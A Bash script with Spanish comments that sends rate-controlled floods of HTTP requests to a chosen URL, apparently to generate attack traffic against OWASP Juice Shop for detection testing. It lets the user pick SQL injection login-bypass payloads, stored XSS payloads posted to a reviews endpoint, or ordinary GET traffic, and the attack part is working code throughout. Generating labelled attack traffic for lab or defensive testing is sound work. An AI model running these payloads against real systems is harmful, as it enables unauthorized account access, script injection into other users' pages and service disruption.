#!/bin/bash

# Función para solicitar un número válido
get_valid_number() {
    local var_name="$1"
    local prompt="$2"
    local value=0
    while true; do
        read -p "$prompt" value
        if [[ "$value" =~ ^[0-9]+$ ]] && [ "$value" -gt 0 ]; then
            echo "$value"
            return
        else
            echo "Por favor ingresa un número válido mayor que 0."
        fi
    done
}

# Función de ataque SQLi
attack_sqli() {
    echo "Iniciando ataque SQLi..."
    for ((i=1; i<=TOTAL_REQUESTS; i++)); do
        curl -o /dev/null -s -w "%{http_code}\n" -X POST \
            -d "email=admin@juice-shop.com" \
            -d "password=' OR 1=1 --" \
            "$TARGET_URL/rest/user/login" &
        if [ $((i % REQUESTS_PER_SECOND)) -eq 0 ]; then
            sleep 1
        fi
    done
}

attack_xss() {
    echo "Iniciando ataque XSS..."
    for ((i=1; i<=TOTAL_REQUESTS; i++)); do
        curl -o /dev/null -s -w "%{http_code}\n" -X POST \
            -d "comment=<script>alert('XSS')</script>" \
            "$TARGET_URL/rest/product/1/reviews" &
        if [ $((i % REQUESTS_PER_SECOND)) -eq 0 ]; then
            sleep 1 
        fi
    done
}

attack_legitimate() {
    echo "Iniciando tráfico legítimo..."
    for ((i=1; i<=TOTAL_REQUESTS; i++)); do
        curl -o /dev/null -s -w "%{http_code}\n" -X GET \
            "$TARGET_URL/" &
        if [ $((i % REQUESTS_PER_SECOND)) -eq 0 ]; then
            sleep 1  
        fi
    done
}

TARGET_URL="http://localhost"  # Cambiar a la URL de tu aplicación
REQUESTS_PER_SECOND=0         # Peticiones por segundo
DURATION=0                    # Duración en segundos
TOTAL_REQUESTS=0              # Total de peticiones a realizar

REQUESTS_PER_SECOND=$(get_valid_number "requests_per_second" "¿Cuántas peticiones por segundo? ")
DURATION=$(get_valid_number "duration" "¿Cuánto tiempo en segundos deseas ejecutar el ataque? ")
TOTAL_REQUESTS=$((REQUESTS_PER_SECOND * DURATION))

echo "Tipo de ataque:"
echo "1. SQLi"
echo "2. XSS"
echo "3. Tráfico legítimo"

read -p "Elige el tipo de ataque (1/2/3): " ATTACK_TYPE

case $ATTACK_TYPE in
    1)
        attack_sqli
        ;;
    2)
        attack_xss
        ;;
    3)
        attack_legitimate
        ;;
    *)
        echo "Opción no válida. Ejecutando tráfico legítimo por defecto."
        attack_legitimate
        ;;
esac

wait

echo "Ataque completado."
